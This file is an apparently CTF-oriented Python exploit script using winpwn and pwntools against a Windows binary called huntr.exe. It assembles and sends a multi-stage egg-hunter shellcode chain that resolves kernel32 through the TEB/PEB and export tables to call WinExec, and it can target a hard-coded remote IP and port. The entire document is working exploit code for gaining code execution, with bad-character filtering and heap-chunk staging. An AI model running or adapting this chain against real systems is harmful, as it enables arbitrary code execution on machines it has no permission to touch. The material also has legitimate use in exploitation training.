#!/usr/bin/env python3
from winpwn import *
from os.path import normpath
from subprocess import run
import pwn

# =========================================================
#                          SETUP                         
# =========================================================
exe = r'..\dist\huntr.exe'
pe  = winfile(exe)
pwn.context.log_level = context.log_level = 'info'
pwn.context.newline = context.newline = '\r\n'
pwn.context.arch = context.arch = 'amd64'
pwn.context.endian = context.endian = 'little'
context.windbgx = normpath('WinDbgX.exe')
# host, port = '127.0.0.1', 1337
host, port = '165.22.110.245', 9002

def initialize():
    if pwn.args.REMOTE:
        return remote(host, port)
    else:
        io = process(exe)
        if pwn.args.DBG:
            windbgx.attach(io, script=windbgscript)
        return io

windbgscript = f'''
.scriptload telescope.js
~0s

bu challenge!main+0x7b0
'''

# =========================================================
#                         EXPLOITS
# =========================================================
def sendlineafter(prompt, data):
    io.recvuntil(prompt)
    io.sendline(data)

def alloc(idnt, data):
    global index
    sendlineafter('>>', '1')
    sendlineafter(':', str(index))

    res = io.recv(6)
    if 'Chunk' in res:
        pwn.log.info(f"index {index} already allocated")
        index = index + 1
        alloc(idnt, data)
        return

    sendlineafter(':', data)
    pwn.log.info(f"allocated {idnt} at index {index}")
    index = index + 1

def check_badchars(name, data):
    pwn.log.info(f"checking limitation for {name}")

    found = False
    for i in data:
        if i in b'\x00\x0a\x0d\x20\x09':
            pwn.log.failure("badchar: %#x", i)
            found = True
    if found:
        print("shellcode dump: ", end='')
        print(''.join('{:02x}'.format(x) for x in data))
        exit(1)

def exploit():
    global io
    global index 
    io = initialize()
    index = 0

    # based upon: 
    # - https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/w64-exec-calc-shellcode.asm
    # - https://github.com/Faran-17/Windows-Internals/blob/main/Processes%20and%20Jobs/Processes/PEB%20-%20Part%201.md#ldr
    # - https://tomsreversing.com/tag/windbg-teb-thread-environment-block-fs-gs-segment-registers-teb-peb/

    # FINDER CONVENTION (EGGHUNTER):
    # R14 = Heap Base (where the shellcode resides)
    # R8 = Address of Stage-1
    # R10 = Address of Stage-2
    # RBP = Address of Stage-3
    # RSI = Current search address
    
    # STAGE-1 CONVENTION (Parsing PE):
    # R11 = Link Addresses
    # RDX = Process Base
    # RCX = Kernel32 Base

    # STAGE-2 CONVENTION (Parsing Export Directory):
    # R9 = RVA of PE Header
    # EBX = RVA of Export Table
    # R12 = Export Name Tables
    # R13 = Export Ordinal Tables
    # R15 = Export Function Tables

    # STAGE-3 CONVENTION (Finding and Call WinExec):
    # R9 = Address of WinExec

    # ========================
    # EGG HUNTER
    # ========================
    idnt = 'hunter'
    run(f'nasm.exe {idnt}.asm')
    payload = open(idnt, "rb").read()
    pwn.log.info("%s: %#x", idnt, len(payload))
    if len(payload) >= 0x60:
        pwn.log.failure(f"{idnt} is too large")
        exit(1)
    check_badchars(idnt, payload)
    sendlineafter('?', payload)

    # ========================
    # TEB -> PE -> Kernel32
    # ========================
    idnt = 'stage-1'
    run(f'nasm.exe {idnt}.asm')
    payload = open(idnt, "rb").read()
    pwn.log.info("%s: %#x", idnt, len(payload))
    if len(payload) >= 0x40:
        pwn.log.failure(f"{idnt} is too large")
        exit(1)
    check_badchars(idnt, payload)
    alloc(idnt, payload)

    # ========================
    # Kernel32 -> IAT
    # ========================
    idnt = 'stage-2'
    run(f'nasm.exe {idnt}.asm')
    payload = open(idnt, "rb").read()
    pwn.log.info("%s: %#x", idnt, len(payload))
    if len(payload) >= 0x40:
        pwn.log.failure(f"{idnt} is too large")
        exit(1)
    check_badchars(idnt, payload)
    alloc(idnt, payload)

    # ========================
    # IAT -> WinExec
    # ========================
    idnt = 'stage-3'
    run(f'nasm.exe {idnt}.asm')
    payload = open(idnt, "rb").read()
    pwn.log.info("%s: %#x", idnt, len(payload))
    if len(payload) >= 0x40:
        pwn.log.failure(f"{idnt} is too large")
        exit(1)
    check_badchars(idnt, payload)
    alloc(idnt, payload)

    sendlineafter('>>', '7')

    io.interactive()

if __name__ == '__main__':
    exploit()